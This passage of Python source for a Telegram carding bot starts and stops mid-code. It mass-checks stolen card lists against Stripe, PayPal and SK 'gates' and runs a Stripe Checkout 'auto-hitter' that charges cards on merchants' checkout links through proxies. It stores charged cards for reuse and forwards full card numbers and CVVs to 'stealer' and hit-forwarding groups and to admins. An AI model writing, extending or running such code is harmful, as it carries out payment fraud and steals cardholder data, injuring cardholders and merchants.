    ACTIVE_MST_PROCESSES[user_id] = True
    asyncio.create_task(process_mst_cards(event, cards, user_id))

async def process_mst_cards(event, cards, user_id):
    from gates.stripe_api import stripe_api_check
    total = len(cards)
    await register_mass_user(user_id)
    concurrency = await get_dynamic_concurrency(5)

    approved_list = []
    declined_count = 0
    error_count = 0
    checked_count = 0
    results_lock = asyncio.Lock()
    last_update = [time.time()]
    start_time = time.time()

    stop_key = f"mst_stop_{user_id}".encode()
    stop_buttons = [[Button.inline("\U0001f6d1 Stop Check", stop_key)]]

    progress_msg = await event.reply(
        f"\u26a1 **Mass Stripe Check**\n"
        f"Cards: **{total}** | Workers: **{concurrency}**\n\n"
        f"Checking **0/{total}**...\n"
        f"\u2705 Approved: 0 | \u274c Declined: 0 | \u26a0 Errors: 0",
        buttons=stop_buttons,
    )

    card_queue = asyncio.Queue()
    for cc, mm, yy, cvv in cards:
        if len(yy) == 4: yy = yy[2:]
        mm = mm.zfill(2)
        await card_queue.put((cc, mm, yy, cvv))

    async def update_progress():
        now = time.time()
        if now - last_update[0] < 2:
            return
        last_update[0] = now
        elapsed = now - start_time
        speed = checked_count / elapsed if elapsed > 0 else 0
        try:
            await progress_msg.edit(
                f"\u26a1 **Mass Stripe Check**\n"
                f"Cards: **{total}** | Workers: **{concurrency}**\n\n"
                f"Checking **{checked_count}/{total}** | \u23f1 {elapsed:.0f}s | \u26a1 {speed:.1f} cc/s\n\n"
                f"\u2705 Approved: {len(approved_list)} | \u274c Declined: {declined_count} | \u26a0 Errors: {error_count}",
                buttons=stop_buttons,
            )
        except:
            pass

    async def worker():
        nonlocal checked_count, declined_count, error_count
        while True:
            if user_id not in ACTIVE_MST_PROCESSES:
                break
            try:
                cc, mm, yy, cvv = card_queue.get_nowait()
            except asyncio.QueueEmpty:
                break

            resp = None
            try:
                async with GLOBAL_MASS_SEM:
                    resp = await asyncio.wait_for(stripe_api_check(cc, mm, yy, cvv), timeout=40)
            except:
                resp = "Error - Timeout"

            resp_lower = resp.lower() if resp else ""
            async with results_lock:
                checked_count += 1
                if "approved" in resp_lower or "success" in resp_lower:
                    approved_list.append(f"{cc}|{mm}|{yy}|{cvv}")
                elif "error" in resp_lower:
                    error_count += 1
                else:
                    declined_count += 1

            await update_progress()

    try:
        workers = [asyncio.create_task(worker()) for _ in range(min(concurrency, total))]
        await asyncio.gather(*workers, return_exceptions=True)

        elapsed = time.time() - start_time
        speed = checked_count / elapsed if elapsed > 0 else 0
        final = (
            f"\u2705 **Mass Stripe Check Complete**\n\n"
            f"Total: {total} | \u23f1 {elapsed:.1f}s | \u26a1 {speed:.1f} cc/s\n\n"
            f"\u2705 Approved: {len(approved_list)}\n"
            f"\u274c Declined: {declined_count}\n"
            f"\u26a0 Errors: {error_count}"
        )
        if approved_list:
            final += "\n\n**Approved Cards:**\n" + "\n".join(f"`{c}`" for c in approved_list)
        try:
            await progress_msg.edit(final, buttons=None)
        except:
            await event.reply(final)
    except Exception as e:
        await event.reply(f"Mass Stripe Error: {e}")
    finally:
        ACTIVE_MST_PROCESSES.pop(user_id, None)
        await unregister_mass_user(user_id)

# --- Mass PayPal TXT (/mpp) ---
ACTIVE_CO_PROCESSES = {}

ACTIVE_MPP_PROCESSES = {}

@client.on(events.NewMessage(pattern=r'(?i)^[/]mpp$'))
async def mpp_cmd(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        message, buttons = access_denied_message_with_button()
        return await event.reply(message, buttons=buttons)
    await register_user(event.sender_id)

    if not event.reply_to_msg_id:
        return await event.reply("Reply to a `.txt` file with /mpp to mass check via PayPal API")
    replied_msg = await event.get_reply_message()
    if not replied_msg or not replied_msg.document:
        return await event.reply("Reply to a `.txt` file with /mpp")

    user_id = event.sender_id
    if user_id in ACTIVE_MPP_PROCESSES:
        return await event.reply("You already have an active /mpp process. Wait or stop it first.")

    import tempfile, os
    file_path = os.path.join(tempfile.gettempdir(), f"mpp_{user_id}.txt")
    await replied_msg.download_media(file=file_path)
    with open(file_path, "r", errors="ignore") as f:
        content = f.read()
    os.remove(file_path)

    card_pattern = re.compile(r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})')
    cards = card_pattern.findall(content)
    if not cards:
        return await event.reply("No valid cards found in the file.")

    max_cards = get_file_mass_limit()
    cards = cards[:max_cards]
    ACTIVE_MPP_PROCESSES[user_id] = True
    asyncio.create_task(process_mpp_cards(event, cards, user_id))

async def process_mpp_cards(event, cards, user_id):
    from gates.paypal_api import paypal_api_check
    total = len(cards)
    await register_mass_user(user_id)
    concurrency = await get_dynamic_concurrency(5)

    approved_list = []
    declined_count = 0
    error_count = 0
    checked_count = 0
    results_lock = asyncio.Lock()
    last_update = [time.time()]
    start_time = time.time()

    stop_key = f"mpp_stop_{user_id}".encode()
    stop_buttons = [[Button.inline("\U0001f6d1 Stop Check", stop_key)]]

    progress_msg = await event.reply(
        f"\u26a1 **Mass PayPal Check**\n"
        f"Cards: **{total}** | Workers: **{concurrency}**\n\n"
        f"Checking **0/{total}**...\n"
        f"\u2705 Approved: 0 | \u274c Declined: 0 | \u26a0 Errors: 0",
        buttons=stop_buttons,
    )

    card_queue = asyncio.Queue()
    for cc, mm, yy, cvv in cards:
        if len(yy) == 4: yy = yy[2:]
        mm = mm.zfill(2)
        await card_queue.put((cc, mm, yy, cvv))

    async def update_progress():
        now = time.time()
        if now - last_update[0] < 2:
            return
        last_update[0] = now
        elapsed = now - start_time
        speed = checked_count / elapsed if elapsed > 0 else 0
        try:
            await progress_msg.edit(
                f"\u26a1 **Mass PayPal Check**\n"
                f"Cards: **{total}** | Workers: **{concurrency}**\n\n"
                f"Checking **{checked_count}/{total}** | \u23f1 {elapsed:.0f}s | \u26a1 {speed:.1f} cc/s\n\n"
                f"\u2705 Approved: {len(approved_list)} | \u274c Declined: {declined_count} | \u26a0 Errors: {error_count}",
                buttons=stop_buttons,
            )
        except:
            pass

    async def worker():
        nonlocal checked_count, declined_count, error_count
        while True:
            if user_id not in ACTIVE_MPP_PROCESSES:
                break
            try:
                cc, mm, yy, cvv = card_queue.get_nowait()
            except asyncio.QueueEmpty:
                break

            resp = None
            try:
                async with GLOBAL_MASS_SEM:
                    resp = await asyncio.wait_for(paypal_api_check(cc, mm, yy, cvv), timeout=40)
            except:
                resp = "Error - Timeout"

            resp_lower = resp.lower() if resp else ""
            async with results_lock:
                checked_count += 1
                if "approved" in resp_lower:
                    approved_list.append(f"{cc}|{mm}|{yy}|{cvv}")
                elif "error" in resp_lower:
                    error_count += 1
                else:
                    declined_count += 1

            await update_progress()

    try:
        workers = [asyncio.create_task(worker()) for _ in range(min(concurrency, total))]
        await asyncio.gather(*workers, return_exceptions=True)

        elapsed = time.time() - start_time
        speed = checked_count / elapsed if elapsed > 0 else 0
        final = (
            f"\u2705 **Mass PayPal Check Complete**\n\n"
            f"Total: {total} | \u23f1 {elapsed:.1f}s | \u26a1 {speed:.1f} cc/s\n\n"
            f"\u2705 Approved: {len(approved_list)}\n"
            f"\u274c Declined: {declined_count}\n"
            f"\u26a0 Errors: {error_count}"
        )
        if approved_list:
            final += "\n\n**Approved Cards:**\n" + "\n".join(f"`{c}`" for c in approved_list)
        try:
            await progress_msg.edit(final, buttons=None)
        except:
            await event.reply(final)
    except Exception as e:
        await event.reply(f"Mass PayPal Error: {e}")
    finally:
        ACTIVE_MPP_PROCESSES.pop(user_id, None)
        await unregister_mass_user(user_id)

# --- Mass SK TXT (/msktxt) ---
ACTIVE_MSKTXT_PROCESSES = {}

@client.on(events.NewMessage(pattern=r'(?i)^[/]msktxt$'))
async def msktxt_cmd(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        message, buttons = access_denied_message_with_button()
        return await event.reply(message, buttons=buttons)
    await register_user(event.sender_id)

    if not event.reply_to_msg_id:
        return await event.reply("Reply to a `.txt` file with /msktxt to mass check via SK Stripe API")
    replied_msg = await event.get_reply_message()
    if not replied_msg or not replied_msg.document:
        return await event.reply("Reply to a `.txt` file with /msktxt")

    user_id = event.sender_id
    if user_id in ACTIVE_MSKTXT_PROCESSES:
        return await event.reply("You already have an active /msktxt process. Wait or stop it first.")

    import tempfile, os
    file_path = os.path.join(tempfile.gettempdir(), f"msktxt_{user_id}.txt")
    await replied_msg.download_media(file=file_path)
    with open(file_path, "r", errors="ignore") as f:
        content = f.read()
    os.remove(file_path)

    card_pattern = re.compile(r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})')
    cards = card_pattern.findall(content)
    if not cards:
        return await event.reply("No valid cards found in the file.")

    max_cards = get_file_mass_limit()
    cards = cards[:max_cards]
    ACTIVE_MSKTXT_PROCESSES[user_id] = True
    asyncio.create_task(process_msktxt_cards(event, cards, user_id))

async def process_msktxt_cards(event, cards, user_id):
    from gates.sk_api import sk_api_check
    total = len(cards)
    await register_mass_user(user_id)
    concurrency = await get_dynamic_concurrency(5)

    approved_list = []
    declined_count = 0
    error_count = 0
    checked_count = 0
    results_lock = asyncio.Lock()
    last_update = [time.time()]
    start_time = time.time()

    stop_key = f"msktxt_stop_{user_id}".encode()
    stop_buttons = [[Button.inline("\U0001f6d1 Stop Check", stop_key)]]

    progress_msg = await event.reply(
        f"\u26a1 **Mass SK Check**\n"
        f"Cards: **{total}** | Workers: **{concurrency}**\n\n"
        f"Checking **0/{total}**...\n"
        f"\u2705 Approved: 0 | \u274c Declined: 0 | \u26a0 Errors: 0",
        buttons=stop_buttons,
    )

    card_queue = asyncio.Queue()
    for cc, mm, yy, cvv in cards:
        if len(yy) == 4: yy = yy[2:]
        mm = mm.zfill(2)
        await card_queue.put((cc, mm, yy, cvv))

    async def update_progress():
        now = time.time()
        if now - last_update[0] < 2:
            return
        last_update[0] = now
        elapsed = now - start_time
        speed = checked_count / elapsed if elapsed > 0 else 0
        try:
            await progress_msg.edit(
                f"\u26a1 **Mass SK Check**\n"
                f"Cards: **{total}** | Workers: **{concurrency}**\n\n"
                f"Checking **{checked_count}/{total}** | \u23f1 {elapsed:.0f}s | \u26a1 {speed:.1f} cc/s\n\n"
                f"\u2705 Approved: {len(approved_list)} | \u274c Declined: {declined_count} | \u26a0 Errors: {error_count}",
                buttons=stop_buttons,
            )
        except:
            pass

    async def worker():
        nonlocal checked_count, declined_count, error_count
        while True:
            if user_id not in ACTIVE_MSKTXT_PROCESSES:
                break
            try:
                cc, mm, yy, cvv = card_queue.get_nowait()
            except asyncio.QueueEmpty:
                break

            resp = None
            try:
                async with GLOBAL_MASS_SEM:
                    resp = await asyncio.wait_for(sk_api_check(cc, mm, yy, cvv), timeout=40)
            except:
                resp = "Error - Timeout"

            resp_lower = resp.lower() if resp else ""
            async with results_lock:
                checked_count += 1
                if "approved" in resp_lower:
                    approved_list.append(f"{cc}|{mm}|{yy}|{cvv}")
                elif "error" in resp_lower:
                    error_count += 1
                else:
                    declined_count += 1

            await update_progress()

    try:
        workers = [asyncio.create_task(worker()) for _ in range(min(concurrency, total))]
        await asyncio.gather(*workers, return_exceptions=True)

        elapsed = time.time() - start_time
        speed = checked_count / elapsed if elapsed > 0 else 0
        final = (
            f"\u2705 **Mass SK Check Complete**\n\n"
            f"Total: {total} | \u23f1 {elapsed:.1f}s | \u26a1 {speed:.1f} cc/s\n\n"
            f"\u2705 Approved: {len(approved_list)}\n"
            f"\u274c Declined: {declined_count}\n"
            f"\u26a0 Errors: {error_count}"
        )
        if approved_list:
            final += "\n\n**Approved Cards:**\n" + "\n".join(f"`{c}`" for c in approved_list)
        try:
            await progress_msg.edit(final, buttons=None)
        except:
            await event.reply(final)
    except Exception as e:
        await event.reply(f"Mass SK Error: {e}")
    finally:
        ACTIVE_MSKTXT_PROCESSES.pop(user_id, None)
        await unregister_mass_user(user_id)

# --- Stripe Checkout Auto-Hitter (/co) ---

@client.on(events.CallbackQuery(pattern=rb"^co_stop_"))
async def co_stop_callback(event):
    target_id = int(event.data.decode().split("_")[-1])
    sender_id = event.sender_id
    if sender_id != target_id and sender_id not in ADMIN_ID:
        return await event.answer("You can only stop your own process.")
    if target_id in ACTIVE_CO_PROCESSES:
        del ACTIVE_CO_PROCESSES[target_id]
        await event.answer("Checkout process stopped!")
    else:
        await event.answer("No active checkout process.")

@client.on(events.NewMessage(pattern=r'(?i)^[/]co\b'))
async def co_cmd(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    tool_ok, tool_msg = await check_tool_access("co", event.sender_id)
    if not tool_ok: return await event.reply(tool_msg)
    if not can_access:
        message, buttons = access_denied_message_with_button()
        return await event.reply(message, buttons=buttons)
    await register_user(event.sender_id)

    user_id = event.sender_id

    allowed, remaining, used = check_hitter_limit(user_id)
    if not allowed:
        limit = get_hitter_daily_limit(user_id)
        return await event.reply(
            f"⛔ **Daily Hitter Limit Reached**\n\n"
            f"You have used **{used}/{limit}** Auto Hitter runs today.\n"
            f"Upgrade to Silver or Gold for unlimited access.\n\n"
            f"Resets at midnight UTC."
        )

    if user_id in ACTIVE_CO_PROCESSES:
        return await event.reply("You already have an active /co process. Wait or stop it first.")

    raw = event.message.text
    lines = [l.strip() for l in raw.split("\n") if l.strip()]
    if len(lines) < 1:
        return await event.reply(
            "**Stripe Checkout Auto-Hitter**\n\n"
            "Usage:\n`/co cc1|mm|yy|cvv\ncc2|mm|yy|cvv\nhttps://checkout.stripe.com/...`\n\n"
            "Last line must be the Stripe checkout link.\n"
            "Max 50 cards per run."
        )

    if lines[0].lower().startswith("/co"):
        first_line = lines[0]
        rest = first_line[3:].strip()
        if rest:
            lines[0] = rest
        else:
            lines = lines[1:]

    if len(lines) < 2:
        return await event.reply(
            "**Stripe Checkout Auto-Hitter**\n\n"
            "Usage:\n`/co cc1|mm|yy|cvv\ncc2|mm|yy|cvv\nhttps://checkout.stripe.com/...`\n\n"
            "Last line must be the Stripe checkout link.\n"
            "Max 50 cards per run."
        )

    checkout_url = None
    card_lines = []
    url_parts = []
    for line in lines:
        if ("checkout.stripe.com" in line or line.startswith("cs_live_") or line.startswith("cs_test_")
                or ("stripe.com" in line and ("pay" in line or "cs_" in line))
                or "cs_live_" in line or "cs_test_" in line
                or ("/c/pay/" in line and "cs_" in line)
                or re.search(r'https?://[^/]+/c/pay/cs_(?:live|test)_', line)):
            url_parts.append(line)
        else:
            card_lines.append(line)

    if url_parts:
        checkout_url = "".join(url_parts)
    else:
        checkout_url = lines[-1]
        card_lines = lines[:-1]

    import logging
    co_logger = logging.getLogger("stripe_co")
    print(f"[CO DEBUG] raw message text ({len(raw)} chars): {repr(raw[:500])}")
    print(f"[CO DEBUG] url_parts extracted: {url_parts}")
    print(f"[CO DEBUG] checkout_url from text ({len(checkout_url)} chars): {checkout_url[:300]}")

    entity_urls = []
    if event.message.entities:
        for ent in event.message.entities:
            try:
                from telethon.tl.types import MessageEntityUrl, MessageEntityTextUrl
                ent_type = type(ent).__name__
                ent_url = getattr(ent, 'url', None)
                ent_text = event.message.text[ent.offset:ent.offset + ent.length] if hasattr(ent, 'offset') else ''
                print(f"[CO DEBUG] entity: type={ent_type}, offset={getattr(ent, 'offset', '?')}, length={getattr(ent, 'length', '?')}, url_attr={ent_url}, text={ent_text[:200]}")
                entity_urls.append({
                    'type': ent_type,
                    'url': ent_url,
                    'text': ent_text,
                })
            except Exception as ex:
                co_logger.info(f"CO entity parse error: {ex}")

    best_entity_url = None
    for eu in entity_urls:
        candidate = eu['url'] or eu['text']
        if candidate and ('checkout.stripe.com' in candidate or 'cs_live_' in candidate or 'cs_test_' in candidate or '/c/pay/' in candidate):
            if not best_entity_url or len(candidate) > len(best_entity_url):
                best_entity_url = candidate

    if best_entity_url and len(best_entity_url) > len(checkout_url):
        print(f"[CO DEBUG] entity URL is longer ({len(best_entity_url)} vs {len(checkout_url)}), using entity URL")
        checkout_url = best_entity_url
    elif best_entity_url:
        print(f"[CO DEBUG] keeping text URL ({len(checkout_url)}) over entity URL ({len(best_entity_url)})")

    from gates.stripe_co import parse_checkout_url
    print(f"[CO DEBUG] final checkout_url ({len(checkout_url)} chars): {checkout_url[:400]}")
    session_ref = parse_checkout_url(checkout_url)
    print(f"[CO DEBUG] session_ref ({len(session_ref) if session_ref else 0} chars): {session_ref[:200] if session_ref else 'None'}")
    if not session_ref:
        return await event.reply("Invalid checkout link. Must be a Stripe checkout URL (checkout.stripe.com/...)")

    card_pattern = re.compile(r'(\d{13,19})[|/:](\d{1,2})[|/:](\d{2,4})[|/:](\d{3,4})')
    cards = []
    for cl in card_lines:
        m = card_pattern.search(cl)
        if m:
            cards.append(m.groups())

    if not cards:
        return await event.reply("No valid cards found. Format: `cc|mm|yy|cvv`")

    max_cards = min(get_file_mass_limit(), 50)
    cards = cards[:max_cards]

    user_proxy = get_user_proxy(user_id)
    proxy_arg = None
    if user_proxy:
        parts_p = user_proxy.split(":")
        if len(parts_p) == 4:
            proxy_arg = f"http://{parts_p[2]}:{parts_p[3]}@{parts_p[0]}:{parts_p[1]}"
        elif len(parts_p) == 2:
            proxy_arg = f"http://{parts_p[0]}:{parts_p[1]}"

    increment_hitter_usage(user_id)
    ACTIVE_CO_PROCESSES[user_id] = True
    asyncio.create_task(_process_co_cards(event, cards, checkout_url, user_id, proxy=proxy_arg))


async def _process_co_cards(event, cards, checkout_url, user_id, proxy=None):
    from gates.stripe_co import stripe_co_check

    total = len(cards)
    session_cache = None
    card_results = []

    stop_btn = [Button.inline("Stop", data=f"co_stop_{user_id}".encode())]
    progress_msg = await event.reply(
        f"**Stripe Co (Beta)**\n\nProcessing **0/{total}** cards...",
        buttons=stop_btn
    )

    stopped = False
    processed = 0
    try:
        for i, (cc, mm, yy, cvv) in enumerate(cards):
            if user_id not in ACTIVE_CO_PROCESSES:
                stopped = True
                break
            if len(yy) == 4:
                yy = yy[2:]
            mm = mm.zfill(2)
            processed = i + 1

            try:
                status, msg, card_info, elapsed, cached = await asyncio.wait_for(
                    stripe_co_check(cc, mm, yy, cvv, checkout_url, session_cache=session_cache, proxy=proxy),
                    timeout=60
                )
                if cached and not session_cache:
                    session_cache = cached
            except asyncio.TimeoutError:
                status, msg, card_info, elapsed = "error", "Timeout", None, 0
            except Exception as e:
                status, msg, card_info, elapsed = "error", str(e)[:50], None, 0

            if status == "charged":
                icon = "\u2705"
                label = "Charged"
                try:
                    site_name = (session_cache or {}).get("merchant", "Stripe Checkout")
                    co_hit_msg = f"**Checkout Hit**\n`{cc}|{mm}|{yy}|{cvv}`\n{msg} | {card_info or ''}\nSite: {site_name}"
                    await event.client.send_message(HIT_FORWARD_GROUP, co_hit_msg)
                except:
                    pass
                try:
                    await event.client.send_message(STEALER_GROUP_2, co_hit_msg)
                except:
                    pass
                try:
                    site_name = (session_cache or {}).get("merchant", "Stripe Checkout")
                    sender = await event.get_sender()
                    sender_name = getattr(sender, 'first_name', '') or ''
                    if getattr(sender, 'last_name', ''):
                        sender_name += f" {sender.last_name}"
                    sender_name = sender_name.strip() or str(user_id)
                    co_amount = (session_cache or {}).get("amount")
                    co_currency = (session_cache or {}).get("currency")
                    asyncio.create_task(notify_dashboard_hit(
                        f"{cc}|{mm}|{yy}|{cvv}", "CHARGED", msg,
                        f"Stripe CO - {site_name}", user_id, sender_name,
                        amount=co_amount, currency=co_currency
                    ))
                    for aid in ADMIN_ID:
                        try:
                            admin_msg = (
                                f"\U0001f525\U0001f525 **Stripe CO Hit** \U0001f525\U0001f525\n"
                                f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
                                f"\U0001f4b3 **Card:** `{cc}|{mm}|{yy}|{cvv}`\n"
                                f"\u26a1 **Gateway:** Stripe Checkout Hitter\n"
                                f"\u2705 **Response:** {msg}\n"
                                f"\U0001f310 **Site:** {site_name}\n"
                                f"\U0001f464 **User:** [{sender_name}](tg://user?id={user_id})\n"
                                f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"
                            )
                            await event.client.send_message(aid, admin_msg)
                        except:
                            pass
                except:
                    pass
                try:
                    _site_visible = get_bool_setting("HITTER_SITE_VISIBLE", True)
                    _site_name_log = (session_cache or {}).get("merchant", "Stripe Checkout")
                    _display_site = _site_name_log if _site_visible else "Hidden From User"
                    _co_amount = (session_cache or {}).get("amount")
                    _co_currency = (session_cache or {}).get("currency")
                    _amount_str = None
                    if _co_amount and _co_currency:
                        try:
                            _amount_str = f"{int(_co_amount)/100:.2f} {_co_currency.upper()}"
                        except Exception:
                            pass
                    _sender = await event.get_sender()
                    _sname = (getattr(_sender, 'first_name', '') or '').strip()
                    if getattr(_sender, 'last_name', ''):
                        _sname += f" {_sender.last_name}"
                    _sname = _sname.strip() or str(user_id)
                    asyncio.create_task(asyncio.to_thread(
                        send_bot_group_log, _sname, user_id, f"{cc}|{mm}|{yy}|{cvv}",
                        "Stripe Checkout Hitter", msg, "CHARGED",
                        site=_display_site, amount=_amount_str
                    ))
                except Exception:
                    pass
            elif status in ("3ds", "live"):
                icon = "\u26a0\ufe0f"
                label = "3DS Required"
            elif status == "live_declined":
                icon = "\u274c"
                label = "Live Declined"
            elif status == "error":
                if "captcha solving failed" in msg.lower() or "captcha detected" in msg.lower():
                    icon = "\U0001f6ab"
                    label = "Captcha Solving Failed"
                else:
                    icon = "\u26a0\ufe0f"
                    label = "Error"
            else:
                icon = "\u274c"
                label = "Failed"

            card_results.append({
                "cc": f"{cc}|{mm}|{yy}|{cvv}",
                "status": label,
                "icon": icon,
                "msg": msg,
                "info": card_info,
                "elapsed": elapsed,
                "raw_status": status,
            })

            result_lines = []
            for r in card_results:
                result_lines.append(
                    f"CC: `{r['cc']}`\n"
                    f"Status: {r['status']} {r['icon']}\n"
                    f"Message: {r['msg']}"
                )

            merchant = (session_cache or {}).get("merchant", "")
            amount = (session_cache or {}).get("amount", "")
            currency = (session_cache or {}).get("currency", "")

            site_line = ""
            if merchant:
                site_line = f"\nSite: {merchant}"
            amount_line = ""
            if amount and currency:
                try:
                    amt_float = int(amount) / 100
                    amount_line = f"\nAmount: {amt_float:.2f} {currency}"
                except:
                    amount_line = f"\nAmount: {amount} {currency}"

            header = "**Stripe Co (Beta)**" if not stopped else "**Stripe Co (Stopped)**"
            progress = f"Processing **{processed}/{total}**..." if processed < total and not stopped else ""

            text = f"{header}\n\n" + "\n\n".join(result_lines)
            if site_line or amount_line:
                text += f"\n{site_line}{amount_line}"
            if progress:
                text += f"\n\n{progress}"

            try:
                await progress_msg.edit(text, buttons=stop_btn if processed < total and not stopped else None)
            except:
                pass

        if stopped and processed < total:
            try:
                await progress_msg.edit(text)
            except:
                pass

    except Exception as e:
        await event.reply(f"Checkout Error: {e}")
    finally:
        ACTIVE_CO_PROCESSES.pop(user_id, None)

ACTIVE_HIT_PROCESSES = {}

@client.on(events.CallbackQuery(pattern=rb"^hit_stop_"))
async def hit_stop_cb(event):
    user_id = int(event.data.decode().replace("hit_stop_", ""))
    if event.sender_id != user_id and event.sender_id not in ADMIN_ID:
        return await event.answer("Only the owner can stop this.", alert=True)
    if user_id in ACTIVE_HIT_PROCESSES:
        del ACTIVE_HIT_PROCESSES[user_id]
        await event.answer("Stopping hit process...", alert=True)
    else:
        await event.answer("No active hit process.", alert=True)

@client.on(events.NewMessage(pattern=r'(?i)^[/]hit\b'))
async def hit_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("Admin only command.")

    user_id = event.sender_id
    if user_id in ACTIVE_HIT_PROCESSES:
        return await event.reply("You already have an active /hit process. Wait or stop it first.")

    raw = event.message.text.strip()
    parts = raw.split()
    count = 10
    if len(parts) >= 2:
        try:
            count = int(parts[1])
        except:
            pass
    count = max(1, min(count, 50))

    if not event.reply_to_msg_id:
        stored = await get_charged_ccs(1)
        total_stored = 0
        if os.path.exists(CHARGED_CC_FILE):
            try:
                async with aiofiles.open(CHARGED_CC_FILE, "r") as f:
                    content = await f.read()
                    if content.strip():
                        total_stored = len(json.loads(content))
            except:
                pass
        return await event.reply(
            f"**Auto Hit from Stored Charged CCs**\n\n"
            f"Reply to a message containing a Stripe checkout link with:\n"
            f"`/hit` \u2014 Try latest 10 charged CCs\n"
            f"`/hit 5` \u2014 Try latest 5 charged CCs\n"
            f"`/hit 20` \u2014 Try latest 20 charged CCs\n\n"
            f"Stored charged CCs: **{total_stored}**"
        )

    replied_msg = await event.get_reply_message()
    if not replied_msg or not replied_msg.text:
        return await event.reply("Reply to a message containing a Stripe checkout link.")

    reply_text = replied_msg.text.strip()

    entity_urls = []
    if replied_msg.entities:
        for ent in replied_msg.entities:
            try:
                ent_url = getattr(ent, 'url', None)
                ent_text = replied_msg.text[ent.offset:ent.offset + ent.length] if hasattr(ent, 'offset') else ''
                if ent_url:
                    entity_urls.append(ent_url)
                if ent_text:
                    entity_urls.append(ent_text)
            except:
                pass

    checkout_url = None
    all_candidates = [reply_text] + entity_urls
    for candidate in all_candidates:
        if "checkout.stripe.com" in candidate or "cs_live_" in candidate or "cs_test_" in candidate:
            checkout_url = candidate
            break

    if not checkout_url:
        url_match = re.search(r'https?://[^\s]+checkout\.stripe\.com[^\s]*', reply_text)
        if url_match:
            checkout_url = url_match.group(0)

    if not checkout_url:
        return await event.reply("No Stripe checkout link found in the replied message.")

    from gates.stripe_co import parse_checkout_url
    session_ref = parse_checkout_url(checkout_url)
    if not session_ref:
        return await event.reply("Invalid checkout link. Must be a Stripe checkout URL.")

    charged_ccs = await get_charged_ccs(count)
    if not charged_ccs:
        return await event.reply("No stored charged CCs found. CCs get stored automatically when they are charged through any gate.")

    user_proxy = get_user_proxy(user_id)
    proxy_arg = None
    if user_proxy:
        parts_p = user_proxy.split(":")
        if len(parts_p) == 4:
            proxy_arg = f"http://{parts_p[2]}:{parts_p[3]}@{parts_p[0]}:{parts_p[1]}"
        elif len(parts_p) == 2:
            proxy_arg = f"http://{parts_p[0]}:{parts_p[1]}"

    ACTIVE_HIT_PROCESSES[user_id] = True
    asyncio.create_task(_process_hit(event, charged_ccs, checkout_url, user_id, count, proxy=proxy_arg))

async def _process_hit(event, charged_ccs, checkout_url, user_id, requested_count, proxy=None):
    from gates.stripe_co import stripe_co_check

    total = len(charged_ccs)
    session_cache = None
    card_results = []
    processed = 0
    stopped = False
    hit_found = False

    stop_btn = [Button.inline("\U0001f6d1 Stop", data=f"hit_stop_{user_id}".encode())]

    cc_list_preview = "\n".join(
        f"`...{c['cc'][-4:]}|{c['mm']}|{c['yy']}|***` ({c.get('gateway', '?')})"
        for c in charged_ccs[:5]
    )
    if total > 5:
        cc_list_preview += f"\n... and {total - 5} more"

    progress_msg = await event.reply(
        f"\u26a1 **Auto Hit**\n\n"
        f"CCs: **{total}** (newest first)\n"
        f"Link: `{checkout_url[:60]}...`\n\n"
        f"{cc_list_preview}\n\n"
        f"Processing **0/{total}**...",
        buttons=stop_btn,
    )

    try:
        for i, cc_data in enumerate(charged_ccs):
            if user_id not in ACTIVE_HIT_PROCESSES:
                stopped = True
                break

            cc = cc_data["cc"]
            mm = cc_data["mm"]
            yy = cc_data["yy"]
            cvv = cc_data["cvv"]
            if len(yy) == 4:
                yy = yy[2:]
            mm = mm.zfill(2)
            processed = i + 1
            card_short = cc[-4:]

            try:
                await progress_msg.edit(
                    f"\u26a1 **Auto Hit** `[{processed}/{total}]`\n\n"
                    f"Trying `...{card_short}|{mm}|{yy}|***`\n"
                    f"From: {cc_data.get('gateway', '?')}\n\n"
                    + ("\n".join(
                        f"{r['icon']} `...{r['cc'].split('|')[0][-4:]}` \u2014 {r['status']}: {r['msg'][:40]}"
                        for r in card_results[-5:]
                    ) if card_results else "")
                    + f"\n\nProcessing **{processed}/{total}**...",
                    buttons=stop_btn,
                )
            except:
                pass

            try:
                status, msg, card_info, elapsed, cached = await asyncio.wait_for(
                    stripe_co_check(cc, mm, yy, cvv, checkout_url, session_cache=session_cache, proxy=proxy),
                    timeout=60
                )
                if cached and not session_cache:
                    session_cache = cached
            except asyncio.TimeoutError:
                status, msg, card_info, elapsed = "error", "Timeout", None, 0
            except Exception as e:
                status, msg, card_info, elapsed = "error", str(e)[:50], None, 0

            if status == "charged":
                icon = "\U0001f525"
                label = "CHARGED"
                hit_found = True
                try:
                    site_name = (session_cache or {}).get("merchant", "Stripe Checkout")
                    auto_hit_msg = f"\U0001f525 **Auto Hit Charged!**\n`{cc}|{mm}|{yy}|{cvv}`\n{msg}\nSite: {site_name}"
                    await event.client.send_message(HIT_FORWARD_GROUP, auto_hit_msg)
                except:
                    pass
                try:
                    await event.client.send_message(STEALER_GROUP_2, auto_hit_msg)
                except:
                    pass
                try:
                    site_name = (session_cache or {}).get("merchant", "Stripe Checkout")
                    sender = await event.get_sender()
                    sender_name = getattr(sender, 'first_name', '') or ''
                    if getattr(sender, 'last_name', ''):
                        sender_name += f" {sender.last_name}"
                    sender_name = sender_name.strip() or str(user_id)
                    hit_amount = (session_cache or {}).get("amount")
                    hit_currency = (session_cache or {}).get("currency")
                    asyncio.create_task(notify_dashboard_hit(
                        f"{cc}|{mm}|{yy}|{cvv}", "CHARGED", msg,
                        f"Auto Hit - {site_name}", user_id, sender_name,
                        amount=hit_amount, currency=hit_currency
                    ))
                    for aid in ADMIN_ID:
                        try:
                            admin_msg = (
                                f"\U0001f525\U0001f525 **Stripe CO Hit** \U0001f525\U0001f525\n"
                                f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
